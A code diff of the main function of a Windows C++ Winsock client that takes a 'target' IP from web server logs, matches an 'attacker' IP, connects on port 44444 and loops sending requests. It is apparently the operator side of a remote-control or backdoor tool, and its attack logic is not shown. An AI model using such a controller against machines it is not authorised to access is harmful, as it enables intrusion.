@@ -3,69 +3,73 @@
 
 
 int main() {
-    SOCKET ServerSocket;
-    int Result;
-    char SenderIP[MAX_IPV4_SIZE] = { 0 };
-    char ServerIP[MAX_IPV4_SIZE] = { 0 };
+    SOCKET TargetSocket = 0;
+    int ConnectionResult = 0;
+    char AttackerIP[MAX_IPV4_SIZE] = { 0 };
+    char TargetIP[MAX_IPV4_SIZE] = { 0 };
+    USHORT TargetPort = 44444;
+    USHORT AttackerPort = 44444;
+    NETWORK_INFO ConnConfigArray[2] = { 0 };
+    WSADATA WSAData = { 0 };
+
+
+    // Get IP address of target and match it to one of the attacker's IP addresses:
     printf("[!] Write IP address of target (see in the web server requests logs) -> ");
-    std::cin >> ServerIP;
-    if (!IsValidIp(ServerIP)) {
-        printf("\n[-] Wrong format of IPV4 address, format should consist of:\n1. 4 one digit - triple digit numerical values in the range of 1-255\n2. There should be a . between each chunk and the previous chunk\n3. address should NOT consist any other non-numerical characters except the 3 . between each 2 chunks\nExample address: 192.1.178.49\n");
+    scanf_s("%s", TargetIP);
+    if (!IpAddresses::IsValidIp(TargetIP)) {
+        printf("\n[-] Wrong format of IPV4 address, format should consist of:\n"
+               "1. 4 one digit - triple digit numerical values in the range of 1-255\n"
+               "2. There should be a . between each chunk and the previous chunk\n"
+               "3. address should NOT consist any other non-numerical characters except the 3 . between each 2 chunks\n"
+               "Example address: 192.1.178.49\n");
         return 0;
     }
-
-    if (!MatchIpAddresses(SenderIP, ServerIP)) {
+    if (!IpAddresses::MatchIpAddresses(AttackerIP, TargetIP)) {
         printf("\n[-] Could not get the address of the attacker machine relatively to the target machine!\n");
         return 0;
     }
-    printf("\nTarget address: %s, attacker address: %s\n", ServerIP, SenderIP);
-
-    USHORT SrvPort = 44444;
-    USHORT SndPort = 44444;
-    NETWORK_INFO NetArr[2];
-    SetNetStructs(ServerIP, SenderIP, SrvPort, SndPort, NetArr);
+    printf("\nTarget address: %s, attacker address: %s\n", TargetIP, AttackerIP);
+    SetNetStructs(TargetIP, AttackerIP, TargetPort, AttackerPort, ConnConfigArray);
 
 
-    // Initialize Winsock (required for using sockets and socket functions) -
-    WSADATA wsaData;
-    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
-        std::cerr << "Winsock initialization process failed\n";
+    // Initialize Winsock (required for using sockets and socket functions):
+    if (WSAStartup(MAKEWORD(2, 2), &WSAData) != 0) {
+        printf("Winsock initialization process failed - %d\n", WSAGetLastError());
         return 1;
     }
 
 
-    // Create sending socket -
-    ServerSocket = socket(AF_INET, SOCK_STREAM, 0);
-    if (ServerSocket == INVALID_SOCKET) {
-        std::cerr << "Could not create socket object: " << WSAGetLastError() << "\n";
+    // Create client socket:
+    TargetSocket = socket(AF_INET, SOCK_STREAM, 0);
+    if (TargetSocket == INVALID_SOCKET) {
+        printf("Could not create socket object - %d\n", WSAGetLastError());
         WSACleanup();
         return 1;
     }
-    NetArr[0].AsoSock = ServerSocket;
+    ConnConfigArray[0].AsoSock = TargetSocket;
 
 
 
-    // Connect socket -
-    if (connect(NetArr[0].AsoSock, (sockaddr*)&NetArr[1].AddrInfo, sizeof(sockaddr)) == SOCKET_ERROR) {
-        std::cerr << "Error connecting to server: " << WSAGetLastError() << std::endl;
-        closesocket(NetArr[0].AsoSock);
+    // Connect to target socket:
+    if (connect(ConnConfigArray[0].AsoSock, (sockaddr*)&ConnConfigArray[1].AddrInfo, sizeof(sockaddr)) == SOCKET_ERROR) {
+        printf("Error connecting to target - %d\n", WSAGetLastError());
+        closesocket(ConnConfigArray[0].AsoSock);
         WSACleanup();
         return 1;
     }
 
 
-    // Start main operations -
+    // Start main operations:
     printf("Initialization of connection succeeded, proceeding to start sending requests..\n");
-    while (1 == 1) {
-        Result = ReqAct(NetArr[0], NetArr[1]);
-        CleanNetStack(NetArr[0].AsoSock);
-        if (Result == -1) {
-            closesocket(NetArr[0].AsoSock);
+    while (TRUE) {
+        ConnectionResult = ClientOperation(ConnConfigArray[0], ConnConfigArray[1]);
+        CleanNetStack(ConnConfigArray[0].AsoSock);
+        if (ConnectionResult == -1) {
+            closesocket(ConnConfigArray[0].AsoSock);
             WSACleanup();
-            return -45;
+            return 1;
         }
     }
-
     WSACleanup();
     return 0;
 }
